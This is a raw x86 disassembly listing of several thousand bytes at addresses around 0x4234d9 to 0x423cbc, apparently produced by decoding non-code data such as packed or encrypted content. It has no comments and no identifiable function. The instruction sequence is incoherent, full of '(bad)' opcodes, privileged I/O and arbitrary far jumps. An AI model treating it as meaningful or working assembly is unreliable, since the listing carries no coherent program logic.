  4234d9:	xor    edi,DWORD PTR [eax+0x1a29e680]
  4234df:	dec    esi
  4234e0:	mov    bh,0xf7
  4234e2:	rol    DWORD PTR [ebx],cl
  4234e4:	pop    ebp
  4234e5:	inc    ebx
  4234e6:	and    DWORD PTR es:[ebp-0x4],0x46
  4234eb:	push   esp
  4234ec:	icebp  
  4234ed:	fwait
  4234ee:	(bad)  
  4234ef:	icebp  
  4234f0:	mov    ch,0xf3
  4234f2:	xchg   ebp,eax
  4234f3:	std    
  4234f4:	addr16 mov dl,0x68
  4234f7:	mov    bl,dl
  4234f9:	popa   
  4234fa:	xchg   edx,eax
  4234fb:	and    esp,edi
  4234fd:	loopne 0x4234b0
  4234ff:	arpl   WORD PTR [ecx+0x8b25342],di
  423505:	and    bl,dh
  423507:	test   BYTE PTR [esi],ah
  423509:	(bad)  [ebx]
  42350b:	jb     0x42352c
  42350d:	mov    dh,0x3e
  42350f:	xor    al,0x1e
  423511:	retf   
  423512:	int3   
  423513:	jnp    0x423555
  423515:	stc    
  423516:	repz push esp
  423518:	sbb    al,al
  42351a:	movnti DWORD PTR [edx+0x1f],edx
  42351e:	hlt    
  42351f:	push   0x4157628e
  423524:	mov    ebx,0x81feddd4
  423529:	adc    eax,0xa53b6b78
  42352e:	add    BYTE PTR [esi-0x7],bh
  423531:	pop    ecx
  423532:	int    0xea
  423534:	fs popf 
  423536:	in     al,dx
  423537:	adc    BYTE PTR [edx+0x7b9bf76e],dh
  42353d:	sbb    al,0xf2
  42353f:	mov    bl,al
  423541:	loope  0x42351e
  423543:	(bad)  
  423544:	enter  0xa296,0x8b
  423548:	mov    ds:0xd7d9f2c7,eax
  42354d:	fnstcw WORD PTR [ebp+edi*8-0x569a1789]
  423554:	push   ebp
  423555:	rcl    DWORD PTR [ebx+0x5],cl
  423558:	mov    bl,0xe
  42355a:	cld    
  42355b:	mov    dh,0xf4
  42355d:	iret   
  42355e:	cmc    
  42355f:	jmp    0x3935:0x3c8c54a7
  423566:	sbb    DWORD PTR [esi-0xf],ebp
  423569:	sbb    al,0x6e
  42356b:	ret    0x5be6
  42356e:	sub    DWORD PTR [ebx-0x41],edi
  423571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423572:	fwait
  423573:	mov    esi,0x2c8bbf76
  423578:	clc    
  423579:	adc    BYTE PTR [eax+eiz*4],ch
  42357c:	ins    DWORD PTR es:[edi],dx
  42357d:	cmp    edi,DWORD PTR [eax]
  42357f:	adc    bl,BYTE PTR [edi-0x4b]
  423582:	pop    ds
  423583:	mov    bl,BYTE PTR [ebp-0xd7adb9a]
  423589:	sub    eax,0x7bc67a8b
  42358e:	inc    DWORD PTR [ebx]
  423590:	je     0x423549
  423592:	scas   eax,DWORD PTR es:[edi]
  423593:	pop    ebp
  423594:	je     0x423544
  423596:	iret   
  423597:	dec    eax
  423598:	cmp    eax,0xd503acc2
  42359d:	mov    bh,0x2f
  42359f:	pushf  
  4235a0:	shl    ch,1
  4235a2:	fldcw  WORD PTR [ebx+ecx*4+0x52]
  4235a6:	add    eax,0xacc2a7a1
  4235ab:	inc    eax
  4235ac:	add    eax,0x6f636d94
  4235b1:	mov    edx,0x3e6c0505
  4235b6:	(bad)  
  4235b7:	push   0xe6d65579
  4235bc:	or     eax,0x748861c7
  4235c1:	test   eax,0x8b7f7d82
  4235c6:	or     edx,DWORD PTR [ebx+0x479f5b63]
  4235cc:	imul   eax,DWORD PTR [ebp-0x1e],0x6f
  4235d0:	and    BYTE PTR [ecx+0x4a],bl
  4235d3:	sbb    eax,0xda784748
  4235d8:	and    esi,DWORD PTR ds:0xbf5c0000
  4235de:	arpl   WORD PTR [eax-0x1d],dx
  4235e1:	fdivr  QWORD PTR [edi-0x41]
  4235e4:	popa   
  4235e5:	hlt    
  4235e6:	mov    esi,0xbed5161d
  4235eb:	xor    DWORD PTR [edx],0xffffffb0
  4235ee:	add    DWORD PTR [eax],eax
  4235f0:	xchg   BYTE PTR [edx],al
  4235f2:	add    BYTE PTR [eax],al
  4235f4:	and    al,0x9f
  4235f6:	lods   al,BYTE PTR ds:[esi]
  4235f7:	in     al,dx
  4235f8:	mul    BYTE PTR [eax-0x42]
  4235fb:	rcr    BYTE PTR [eax-0x3e],1
  4235fe:	nop
  4235ff:	or     esp,DWORD PTR [esi+esi*8]
  423602:	sub    BYTE PTR [ebx+0x39],dh
  423605:	and    BYTE PTR [ebp+0x1e031a67],bl
  42360b:	in     al,dx
  42360c:	mov    esi,0xb5a81cb4
  423611:	adc    DWORD PTR [eax],eax
  423613:	sbb    ebx,DWORD PTR [edx+0x5d]
  423616:	dec    ecx
  423617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423618:	sub    BYTE PTR [eax-0xe],dh
  42361b:	mov    ebp,0xfa0b0755
  423620:	gs xor dl,ah
  423623:	push   edx
  423624:	test   al,0x35
  423626:	mov    dh,0x90
  423628:	(bad)  
  423629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42362a:	inc    ebp
  42362b:	add    DWORD PTR ds:0x727e0a52,edi
  423631:	pop    esi
  423632:	cmp    DWORD PTR [edi+0x0],esi
  423635:	sbb    BYTE PTR [ebx-0x6ad371de],ch
  42363b:	add    al,cl
  42363d:	(bad)  
  42363e:	push   esp
  42363f:	add    DWORD PTR [esi+ecx*8-0x19],ebp
  423643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423644:	daa    
  423645:	xchg   edi,eax
  423646:	xchg   edx,eax
  423647:	fwait
  423648:	sbb    al,dh
  42364a:	dec    edx
  42364b:	leave  
  42364c:	adc    DWORD PTR [edi],ecx
  42364e:	xchg   ebx,eax
  42364f:	add    edx,esi
  423651:	mov    ebp,0xb97bae6e
  423656:	mov    cl,0xae
  423658:	dec    edi
  423659:	jne    0x423635
  42365b:	push   0x8a9cccdc
  423660:	fdivr  DWORD PTR [esi-0x4c]
  423663:	popf   
  423664:	or     DWORD PTR [edx+0x7e13ca70],0xd
  42366b:	ds or  al,0x1d
  42366e:	test   DWORD PTR [edx+0x5da7cc7d],edx
  423674:	xchg   edx,eax
  423675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423676:	ficomp WORD PTR [edi+0x1c508504]
  42367c:	enter  0xe9f3,0x31
  423680:	nop
  423681:	push   eax
  423682:	cli    
  423683:	scas   al,BYTE PTR es:[edi]
  423684:	dec    BYTE PTR ds:0xa74aea55
  42368a:	cwde   
  42368b:	inc    ebp
  42368c:	out    dx,eax
  42368d:	xchg   esi,eax
  42368e:	dec    ebx
  42368f:	jp     0x423628
  423691:	loope  0x4236dd
  423693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423694:	sahf   
  423695:	xchg   BYTE PTR [edi+0x57],bl
  423698:	inc    ebx
  423699:	rol    BYTE PTR [ebx+0x3d],1
  42369c:	jmp    0x405a9354
  4236a1:	arpl   WORD PTR [edx+0x46],dx
  4236a4:	aaa    
  4236a5:	lahf   
  4236a6:	cs dec edi
  4236a8:	test   DWORD PTR [ecx],ebx
  4236aa:	jb     0x4236e8
  4236ac:	rcr    DWORD PTR [edi],0xd8
  4236af:	ret    
  4236b0:	lods   eax,DWORD PTR ds:[esi]
  4236b1:	jae    0x42366b
  4236b3:	lea    ebp,[edi+0x41]
  4236b6:	in     eax,dx
  4236b7:	imul   edx,DWORD PTR [edi],0xffffffac
  4236ba:	inc    edx
  4236bb:	mov    bl,0xeb
  4236bd:	nop
  4236be:	mov    ds:0x4909f547,al
  4236c3:	loope  0x4236ad
  4236c5:	pop    edi
  4236c6:	inc    edx
  4236c7:	jle    0x42373a
  4236c9:	es mov dl,0xdc
  4236cc:	add    BYTE PTR [edi],cl
  4236ce:	cmc    
  4236cf:	mov    bl,0x6e
  4236d1:	gs sub al,0x7c
  4236d4:	or     DWORD PTR [esi],ebp
  4236d6:	bswap  esp
  4236d8:	ret    0xed
  4236db:	inc    edx
  4236dc:	jno    0x423753
  4236de:	mov    ds:0xd76796e8,al
  4236e3:	inc    edi
  4236e4:	jno    0x4236f7
  4236e6:	xlat   BYTE PTR ds:[ebx]
  4236e7:	ins    BYTE PTR es:[edi],dx
  4236e8:	push   ecx
  4236e9:	pop    eax
  4236ea:	mov    eax,edx
  4236ec:	and    DWORD PTR [esi],0x62
  4236ef:	dec    ebx
  4236f0:	jmp    0x657e:0x7ebe3609
  4236f7:	enter  0x2b9,0x70
  4236fb:	push   ebp
  4236fc:	jg     0x42369d
  4236fe:	pop    ecx
  4236ff:	mov    al,0xaf
  423701:	loope  0x4236b0
  423703:	neg    dl
  423705:	or     ecx,DWORD PTR [edi]
  423707:	jp     0x423706
  423709:	dec    ebx
  42370a:	stos   BYTE PTR es:[edi],al
  42370b:	push   ebx
  42370c:	pop    ss
  42370d:	adc    BYTE PTR [eax-0x65],cl
  423710:	xchg   ecx,eax
  423711:	out    0x54,al
  423713:	shl    BYTE PTR [edi-0x43],cl
  423716:	jge    0x4236a3
  423718:	or     al,0xf4
  42371b:	ins    DWORD PTR es:[edi],dx
  42371c:	(bad)  
  42371d:	push   edx
  42371e:	pusha  
  42371f:	aas    
  423720:	(bad)  
  423721:	or     DWORD PTR [esi],edx
  423723:	xor    ecx,DWORD PTR fs:[edi+ebx*8]
  423727:	cmc    
  423728:	push   es
  423729:	aaa    
  42372a:	cli    
  42372b:	mov    ebx,0x4deb9123
  423730:	enter  0x22ad,0x39
  423734:	xchg   esi,ebp
  423736:	inc    ecx
  423737:	mov    ch,0x30
  423739:	jmp    0x400a8615
  42373e:	(bad)  
  42373f:	popf   
  423740:	(bad)  
  423742:	jge    0x42370a
  423744:	mov    bh,0x7c
  423746:	and    DWORD PTR [edx-0x30],esi
  423749:	xor    edx,ebp
  42374b:	and    DWORD PTR [esi-0x4],esp
  42374e:	mov    ds:0xa31129fa,eax
  423753:	and    ch,BYTE PTR [ecx-0x630c7b71]
  423759:	fwait
  42375a:	adc    esp,0x94416394
  423760:	stos   DWORD PTR es:[edi],eax
  423761:	scas   eax,DWORD PTR es:[edi]
  423762:	xor    al,0xc3
  423764:	addr16 pop esi
  423766:	and    esp,DWORD PTR [edx-0x319dfeec]
  42376c:	test   al,0x95
  42376e:	xor    al,0xe5
  423770:	mov    ebp,0x7c539931
  423775:	add    eax,0xdcee0ab4
  42377a:	stos   DWORD PTR es:[edi],eax
  42377b:	adc    BYTE PTR [ecx+ebx*2+0x300f0ecf],0x74
  423783:	sbb    BYTE PTR [edx+esi*2+0x7e3fdcea],dh
  42378a:	pop    ss
  42378b:	out    0x66,eax
  42378d:	stc    
  42378e:	outs   dx,BYTE PTR ds:[esi]
  42378f:	cmp    eax,0x57d61163
  423794:	in     al,dx
  423795:	pop    ds
  423796:	repz mov bh,0xa0
  423799:	js     0x423721
  42379b:	shl    DWORD PTR [esi],0x7d
  42379e:	push   esi
  42379f:	adc    al,0x36
  4237a1:	xchg   ebp,eax
  4237a2:	ins    DWORD PTR es:[edi],dx
  4237a3:	loopne 0x423823
  4237a5:	fisub  WORD PTR [esi+0x3c750ee2]
  4237ab:	push   ss
  4237ac:	or     eax,0xd412876e
  4237b1:	pop    ebx
  4237b2:	add    esp,DWORD PTR [esi+edx*8]
  4237b5:	test   eax,0xb3354ca
  4237ba:	push   0xff809ca6
  4237bf:	scas   eax,DWORD PTR es:[edi]
  4237c0:	leave  
  4237c1:	xor    al,0x7d
  4237c3:	push   ebx
  4237c4:	jmp    0x1d5c:0x10fb2c56
  4237cb:	dec    ecx
  4237cc:	test   eax,0x5d77b9ab
  4237d1:	bound  esi,QWORD PTR [ebp+0x3d]
  4237d4:	(bad)  [eax+edx*1+0x25]
  4237d8:	ficomp DWORD PTR [edx]
  4237da:	push   cs
  4237db:	push   0xd6ed5fdd
  4237e0:	jg     0x42384c
  4237e2:	inc    edi
  4237e3:	inc    edx
  4237e4:	bt     DWORD PTR [edi],0x9f
  4237e8:	push   esi
  4237e9:	in     eax,dx
  4237ea:	fnsave [edx]
  4237ec:	fstp   TBYTE PTR [esi+eax*2-0xc]
  4237f0:	sti    
  4237f1:	test   al,0x9c
  4237f3:	cmp    BYTE PTR ds:0xc3ae357a,bl
  4237f9:	sbb    ch,dl
  4237fb:	mov    al,0x4e
  4237fd:	push   cs
  4237fe:	pop    esi
  4237ff:	mov    edi,0x77bd2fa9
  423804:	fimul  DWORD PTR [ebx+0x76]
  423807:	mov    ds:0x7bc64868,al
  42380c:	add    DWORD PTR [edi+eiz*8],ebp
  42380f:	ret    0x4399
  423812:	retf   0xad75
  423815:	mov    eax,0x7cc03d3c
  42381a:	jl     0x4237d9
  42381c:	xor    DWORD PTR [ebp+0x2d],edi
  42381f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423820:	adc    al,0x88
  423822:	sbb    dh,BYTE PTR [ebp+0x77e1e822]
  423828:	push   ebx
  423829:	pop    ebp
  42382a:	mov    ecx,0xe3a6027e
  42382f:	inc    edi
  423830:	and    BYTE PTR ds:0x3dd791ee,bl
  423836:	push   ds
  423837:	call   eax
  423839:	je     0x4238b8
  42383b:	outs   dx,BYTE PTR ds:[esi]
  42383c:	imul   ecx,DWORD PTR [esi+0x1cecaca5],0x57e03340
  423846:	lock fsubrp st(4),st
  423849:	lods   al,BYTE PTR ds:[esi]
  42384a:	sbb    al,BYTE PTR [esi-0x12]
  42384d:	jae    0x423878
  42384f:	call   0x430c:0x60eb4586
  423856:	xlat   BYTE PTR ds:[ebx]
  423857:	mov    edi,0x3d3057bc
  42385c:	pop    ss
  42385d:	icebp  
  42385e:	ss inc ecx
  423860:	pop    es
  423861:	ins    DWORD PTR es:[edi],dx
  423862:	xchg   ebp,eax
  423863:	mov    ds:0xcf5a6690,al
  423868:	dec    edi
  423869:	daa    
  42386a:	cmp    al,0x8e
  42386c:	inc    edx
  42386d:	xor    dh,ah
  42386f:	dec    eax
  423870:	ret    
  423871:	loope  0x42388e
  423873:	ffree  st(0)
  423875:	mov    ds:0xdb5331dc,eax
  42387a:	add    BYTE PTR [eax],al
  42387c:	inc    ebx
  42387d:	push   ebp
  42387e:	pusha  
  42387f:	(bad)  
  423880:	jbe    0x423841
  423882:	out    dx,eax
  423883:	fnstsw WORD PTR [edx+0x5b4356c3]
  423889:	mov    eax,ds:0xb2b86aed
  42388e:	add    DWORD PTR [eax],eax
  423890:	xchg   BYTE PTR [edx],al
  423892:	add    BYTE PTR [eax],al
  423894:	sahf   
  423895:	or     BYTE PTR [esi+ebx*4-0xb],dl
  423899:	and    BYTE PTR [ebx],dh
  42389b:	add    DWORD PTR [esp+ebp*1-0x4ede65a9],esp
  4238a2:	xor    WORD PTR [ecx-0x11],cx
  4238a6:	iret   
  4238a7:	xor    esi,esp
  4238a9:	out    0x5,eax
  4238ab:	in     al,dx
  4238ac:	sbb    ch,0x92
  4238af:	retf   0xc5c3
  4238b2:	js     0x423910
  4238b4:	jl     0x4238a1
  4238b6:	and    BYTE PTR [ebx-0x50],0xc
  4238ba:	sub    esi,DWORD PTR [edx+0x541ee684]
  4238c0:	pop    ebx
  4238c1:	in     eax,dx
  4238c2:	add    BYTE PTR [eax-0x2d6a7f20],cl
  4238c8:	popf   
  4238c9:	add    dl,bl
  4238cb:	sbb    ah,BYTE PTR [edi-0x71]
  4238ce:	iret   
  4238cf:	ret    
  4238d0:	fnstcw WORD PTR [ebx+0x4a0ec606]
  4238d6:	(bad)  
  4238d7:	push   ebx
  4238d8:	dec    edx
  4238d9:	cmp    cl,BYTE PTR [ebx-0x4677c7a3]
  4238df:	call   0x181b0305
  4238e4:	sbb    al,0xe4
  4238e6:	(bad)
  4238e9:	fistp  DWORD PTR [edi+ebx*1+0xd48a08f]
  4238f0:	push   ds
  4238f1:	and    eax,0x62bd4ba7
  4238f6:	ss aaa 
  4238f8:	cmp    eax,DWORD PTR ds:0xf6a976af
  4238fe:	or     DWORD PTR [esi],ebx
  423900:	sub    eax,0x5e294dbb
  423905:	xor    al,0xe4
  423907:	sar    BYTE PTR [edi+0x17],cl
  42390a:	jo     0x423903
  42390c:	xchg   esi,eax
  42390d:	icebp  
  42390e:	addr16 jmp 0x302bf18f
  423914:	fiadd  DWORD PTR [edx]
  423916:	jp     0x423981
  423918:	mov    al,0xb6
  42391a:	ret    0xf33
  42391d:	ins    DWORD PTR es:[edi],dx
  42391e:	fdiv   QWORD PTR [edx+ecx*4+0x4a1a5402]
  423925:	(bad)  
  423927:	(bad)  
  423928:	in     eax,dx
  423929:	nop
  42392a:	mov    edi,0x50e85587
  42392f:	lods   al,BYTE PTR ds:[esi]
  423930:	in     al,0xcd
  423932:	xor    DWORD PTR [ecx],ebx
  423934:	stos   DWORD PTR es:[edi],eax
  423935:	lea    edi,[ecx-0x4efb9a6d]
  42393b:	daa    
  42393c:	sbb    dl,BYTE PTR [edi]
  42393e:	fisub  DWORD PTR [ecx]
  423940:	pop    eax
  423942:	adc    al,0xca
  423944:	push   0x58286047
  423949:	ficomp DWORD PTR [edi-0x3493f942]
  42394f:	out    dx,eax
  423950:	ins    DWORD PTR es:[edi],dx
  423951:	mov    eax,ds:0xa3774e3b
  423956:	jo     0x423971
  423958:	gs je  0x423936
  42395b:	pop    es
  42395c:	sub    dh,BYTE PTR [eax+0x75]
  42395f:	sbb    BYTE PTR [ebp+0x625d7bf7],bl
  423965:	sbb    edi,ebp
  423967:	sbb    al,BYTE PTR [edx+0x6f]
  42396a:	mov    dh,0x82
  42396c:	add    eax,0x260dd350
  423971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423972:	mov    esp,0x44462ee2
  423977:	mov    BYTE PTR [ebx],dl
  423979:	jno    0x4239de
  42397b:	in     al,0xa5
  42397d:	call   0x10f7f4cf
  423982:	(bad)
  423985:	inc    esp
  423986:	jne    0x423949
  423988:	inc    edi
  423989:	adc    BYTE PTR [edx*4-0x41c8c204],ah
  423990:	adc    ch,bl
  423992:	or     eax,0xef81be2f
  423997:	xor    al,0x57
  423999:	data16 fwait
  42399b:	jbe    0x4239ab
  42399d:	sub    edi,edx
  42399f:	xchg   edi,eax
  4239a0:	js     0x4239d7
  4239a2:	mov    ebx,0xa25cd3a
  4239a7:	xor    eax,0x29103bdb
  4239ac:	enter  0xb28a,0xd2
  4239b0:	jbe    0x423960
  4239b2:	mov    cs:0x8b28d46,eax
  4239b8:	cdq    
  4239b9:	push   ebp
  4239ba:	enter  0x3518,0x30
  4239be:	dec    DWORD PTR [ecx]
  4239c0:	xor    eax,0x9eb4e3b7
  4239c5:	imul   esi,DWORD PTR [edx+0x1a],0x61
  4239c9:	retfw  
  4239cb:	je     0x423961
  4239cd:	jge    0x423954
  4239cf:	int3   
  4239d0:	add    BYTE PTR [esi+0x3e0803ac],0xb5
  4239d7:	jle    0x423a00
  4239d9:	test   BYTE PTR [eax-0x63],ah
  4239dc:	push   0xe857e27
  4239e1:	pop    ss
  4239e2:	data16 int3 
  4239e4:	or     edi,DWORD PTR [ebp-0x42]
  4239e7:	hlt    
  4239e8:	mov    ebp,0x3b0e45c3
  4239ed:	jecxz  0x42398f
  4239ef:	push   edx
  4239f0:	ja     0x4239d3
  4239f2:	cwde   
  4239f3:	and    DWORD PTR [ebp-0x7e9842a7],eax
  4239f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239fa:	xchg   DWORD PTR [edi+ecx*1],esi
  4239fd:	mov    ebp,0x785fdc02
  423a02:	mov    bh,dl
  423a04:	fs inc ecx
  423a06:	dec    esp
  423a07:	shr    BYTE PTR [edi+eiz*8],cl
  423a0a:	mov    ebx,0xe46e389a
  423a0f:	mov    ah,0xe8
  423a11:	inc    ecx
  423a12:	mov    esi,DWORD PTR [eax]
  423a14:	retf   0xa58a
  423a17:	and    cl,BYTE PTR [edx]
  423a19:	jo     0x4239a6
  423a1b:	mov    ds:0x32629ed0,al
  423a20:	in     eax,0xce
  423a22:	push   ds
  423a23:	into   
  423a24:	xor    al,0xd6
  423a26:	jmp    0x2a5fe37b
  423a2b:	sub    DWORD PTR [edx],eax
  423a2d:	test   al,0x46
  423a2f:	shl    esp,0x73
  423a32:	inc    eax
  423a33:	icebp  
  423a34:	cmp    ch,BYTE PTR [esi-0x76dd3767]
  423a3a:	in     eax,dx
  423a3b:	aas    
  423a3c:	pop    esi
  423a3d:	mov    edx,edi
  423a3f:	push   edi
  423a40:	stos   DWORD PTR es:[edi],eax
  423a41:	in     eax,dx
  423a42:	push   edx
  423a43:	lea    esi,[ecx]
  423a45:	scas   eax,DWORD PTR es:[edi]
  423a46:	or     dh,BYTE PTR ds:0xf746
  423a4b:	inc    esi
  423a4c:	lods   eax,DWORD PTR ds:[esi]
  423a4d:	add    bl,BYTE PTR [ebx-0x39]
  423a50:	mov    al,ds:0x834693b
  423a55:	inc    ebp
  423a56:	and    DWORD PTR ds:0x83d6ca95,edx
  423a5c:	rcl    DWORD PTR [edx+0x0],0xd4
  423a60:	fcom   QWORD PTR [ebx]
  423a62:	data16 jo 0x423ae3
  423a65:	les    edi,FWORD PTR [ebp+0x42]
  423a68:	inc    eax
  423a69:	xor    dl,BYTE PTR [ebp-0x69]
  423a6c:	mov    ebp,0xd9df320
  423a71:	out    dx,eax
  423a72:	mov    esi,0xf7c0fabf
  423a77:	cmp    DWORD PTR [edx],0x3637b859
  423a7d:	shr    DWORD PTR [eax+0x11a56154],1
  423a83:	in     al,0x27
  423a85:	xor    eax,DWORD PTR [esi-0x79c77379]
  423a8b:	xor    bl,BYTE PTR [ecx+0x2450ed6c]
  423a91:	call   0x1d676d41
  423a96:	in     eax,dx
  423a97:	xchg   cl,cl
  423a99:	or     eax,0x138f8ef3
  423a9e:	inc    edx
  423a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423aa0:	cmp    eax,0x3ed5cc92
  423aa5:	pushf  
  423aa6:	aam    0x5b
  423aa8:	popf   
  423aa9:	retf   
  423aaa:	jle    0x423aef
  423aac:	iret   
  423aad:	dec    edx
  423aae:	test   DWORD PTR [ebx-0x56],ecx
  423ab1:	(bad)  
  423ab3:	mov    eax,0x6df5f622
  423ab8:	pop    ds
  423ab9:	pop    ecx
  423aba:	push   edx
  423abb:	arpl   si,cx
  423abd:	jae    0x423ac6
  423abf:	push   edi
  423ac0:	mov    BYTE PTR [edx+ebp*4],0x57
  423ac4:	stos   DWORD PTR es:[edi],eax
  423ac5:	sbb    ecx,DWORD PTR [ebx-0x7ac7d055]
  423acb:	sbb    bl,BYTE PTR fs:[edx-0x5a7506cb]
  423ad2:	and    BYTE PTR [edx+0xa],dh
  423ad5:	dec    eax
  423ad6:	out    dx,eax
  423ad7:	mov    esi,0xa1c7c033
  423adc:	imul   ebx,DWORD PTR [eax],0xffffff86
  423adf:	call   0xbb06ebf2
  423ae4:	jge    0x423ad9
  423ae6:	aad    0xfa
  423ae8:	and    ecx,DWORD PTR [ebx+0x51187bb2]
  423aee:	retf   0x51f7
  423af1:	fdiv   DWORD PTR [ecx-0x57]
  423af4:	push   eax
  423af5:	dec    edi
  423af6:	call   0x501383ff
  423afb:	in     eax,0x77
  423afd:	fdiv   DWORD PTR [ebx+0x19ceaf6b]
  423b03:	ins    BYTE PTR es:[edi],dx
  423b04:	ja     0x423ae2
  423b06:	push   edx
  423b07:	xchg   esi,eax
  423b08:	imul   DWORD PTR [ebp+0xc]
  423b0b:	ins    DWORD PTR es:[edi],dx
  423b0c:	inc    edx
  423b0d:	dec    ebx
  423b0e:	xor    DWORD PTR [eax+0x20],eax
  423b11:	aaa    
  423b12:	xchg   bl,al
  423b14:	add    bh,ah
  423b16:	pop    ds
  423b17:	enter  0xadfe,0x0
  423b1b:	add    BYTE PTR [edi+0x2d],dl
  423b1e:	pop    es
  423b1f:	call   0x55de:0xeddfba7f
  423b26:	inc    ecx
  423b27:	adc    al,0xd2
  423b29:	retf   0x73a1
  423b2c:	ds mov ch,0x1
  423b2f:	add    BYTE PTR [esi+0x53000002],al
  423b35:	cli    
  423b36:	ins    BYTE PTR es:[edi],dx
  423b37:	and    dh,BYTE PTR [edx]
  423b39:	imul   edi,DWORD PTR [edi],0xffffffb1
  423b3c:	add    BYTE PTR [ecx-0x32ab1dad],0x4c
  423b43:	jo     0x423b1d
  423b45:	outs   dx,DWORD PTR ds:[esi]
  423b46:	mov    edi,DWORD PTR ds:0x6db6f097
  423b4c:	push   edi
  423b4d:	mov    eax,ds:0x41e25f3c
  423b52:	(bad)  
  423b53:	call   0x2abc:0x912355b4
  423b5a:	sbb    al,BYTE PTR [edx+0x7]
  423b5d:	jno    0x423bb9
  423b5f:	fsub   QWORD PTR [edx-0x260fed1]
  423b65:	sub    dl,BYTE PTR [edx+0x1eab15d1]
  423b6b:	out    0x1f,al
  423b6d:	lds    esi,FWORD PTR [eax+eax*2]
  423b70:	test   al,0xfd
  423b72:	repnz push ds
  423b74:	fwait
  423b75:	cwde   
  423b76:	aad    0xd0
  423b78:	dec    esi
  423b79:	mov    ch,0x52
  423b7b:	retf   
  423b7c:	shl    ebp,1
  423b7e:	sub    ecx,eax
  423b80:	ret    
  423b81:	ja     0x423b88
  423b83:	js     0x423b43
  423b85:	cmp    BYTE PTR [ecx+eiz*8+0x43],ch
  423b89:	fild   DWORD PTR [eax+0x6d36befb]
  423b8f:	je     0x423ba8
  423b91:	mov    esi,0x1ed82233
  423b96:	sub    BYTE PTR [ecx+0x4064fdb2],ah
  423b9c:	shl    BYTE PTR [ebp-0x36],0x7c
  423ba0:	imul   ecx,esi,0xffffff88
  423ba3:	push   ebp
  423ba4:	loopne 0x423b6b
  423ba6:	test   al,0x8d
  423ba8:	rcr    BYTE PTR [ebx],0xa5
  423bab:	lods   eax,DWORD PTR ds:[esi]
  423bac:	fs adc eax,0xd06f11e5
  423bb2:	cdq    
  423bb3:	fdivr  QWORD PTR [ebp+0x71]
  423bb6:	sub    BYTE PTR [bp-0x53],al
  423bba:	(bad)  
  423bbb:	and    al,0x2d
  423bbd:	cdq    
  423bbe:	pop    eax
  423bbf:	ret    
  423bc0:	xor    esp,DWORD PTR [edx]
  423bc2:	mov    esp,0xdeca6163
  423bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bc8:	xlat   BYTE PTR ds:[ebx]
  423bc9:	loop   0x423b78
  423bcb:	adc    BYTE PTR [ebx+0x5d],dl
  423bce:	dec    esp
  423bcf:	inc    ecx
  423bd0:	icebp  
  423bd1:	mov    ebx,0xeecbbba3
  423bd6:	pop    es
  423bd7:	mov    esp,0x5135fc30
  423bdc:	or     BYTE PTR [esi+ebx*8+0x1b],ah
  423be0:	stos   BYTE PTR es:[edi],al
  423be1:	xor    al,0xff
  423be3:	pushf  
  423be4:	xchg   DWORD PTR [ebx+0x42],edi
  423be7:	mov    ds:0x62158e2d,al
  423bec:	lea    edx,ds:0x56bec31d
  423bf2:	pop    esi
  423bf3:	sbb    esp,DWORD PTR [esi-0x7fc0b41f]
  423bf9:	fnstsw WORD PTR [edx-0x425e5fbb]
  423bff:	fwait
  423c00:	or     DWORD PTR [esi],edx
  423c02:	or     eax,0x2a05e5e3
  423c07:	jg     0x423c08
  423c09:	cmp    ah,BYTE PTR [ebp-0x13]
  423c0c:	inc    eax
  423c0d:	clc    
  423c0e:	fstp   DWORD PTR [ecx]
  423c10:	jl     0x423bef
  423c12:	adc    eax,0x58a3daa1
  423c17:	jle    0x423c3a
  423c19:	pop    eax
  423c1a:	sbb    al,0xd1
  423c1c:	dec    ecx
  423c1d:	mov    al,ds:0xf877b0f1
  423c22:	dec    esp
  423c23:	jns    0x423c23
  423c25:	(bad)  
  423c27:	add    esi,DWORD PTR [ebx+edi*2]
  423c2a:	dec    ecx
  423c2b:	xchg   edx,eax
  423c2c:	int3   
  423c2d:	addr16 mov esi,0x5bd72df1
  423c33:	aas    
  423c34:	jns    0x423bf1
  423c36:	fs fwait
  423c38:	or     DWORD PTR [edx+edi*2-0x542d404d],0xffffffe2
  423c40:	aas    
  423c41:	mov    cl,0xc6
  423c43:	inc    edx
  423c44:	mov    ch,0x9e
  423c46:	or     eax,0x5c108314
  423c4b:	pusha  
  423c4c:	cmp    al,0xa0
  423c4e:	xor    bh,dh
  423c50:	jg     0x423c4d
  423c52:	jo     0x423c7c
  423c54:	stos   BYTE PTR es:[edi],al
  423c55:	mov    DWORD PTR [ebp+0x46],edi
  423c58:	or     eax,DWORD PTR [ebp-0x2a879735]
  423c5e:	xor    ch,dh
  423c60:	xlat   BYTE PTR ds:[ebx]
  423c61:	xor    DWORD PTR [edx+0x595f987e],0x7b
  423c68:	sub    al,ch
  423c6a:	xchg   ebp,eax
  423c6b:	inc    edx
  423c6c:	popf   
  423c6d:	mov    edx,0x82b8a528
  423c72:	push   edi
  423c73:	lahf   
  423c74:	data16 js 0x423c01
  423c77:	call   0xe5dd55fd
  423c7c:	sbb    eax,0x6ec090ea
  423c81:	push   0xb
  423c83:	mov    edx,ebp
  423c85:	and    dh,bh
  423c87:	cli    
  423c88:	or     eax,0xe64ac438
  423c8d:	push   ds
  423c8e:	pusha  
  423c8f:	inc    eax
  423c90:	ins    DWORD PTR es:[edi],dx
  423c91:	test   cl,al
  423c93:	jmp    0x423d00
  423c95:	nop
  423c96:	loop   0x423cd0
  423c98:	call   0xd477:0x48d5357a
  423c9f:	push   0x84642bfd
  423ca4:	inc    esi
  423ca5:	mov    ah,0x7c
  423ca7:	rep outs dx,BYTE PTR ds:[esi]
  423ca9:	int3   
  423caa:	hlt    
  423cab:	bound  esp,QWORD PTR [ebx+0x660652cb]
  423cb1:	mov    ds:0x1c037150,eax
  423cb6:	aas    
  423cb7:	jg     0x423cdc
  423cb9:	rol    esi,0x8f
  423cbc:	adc    eax,0xf40d12e2
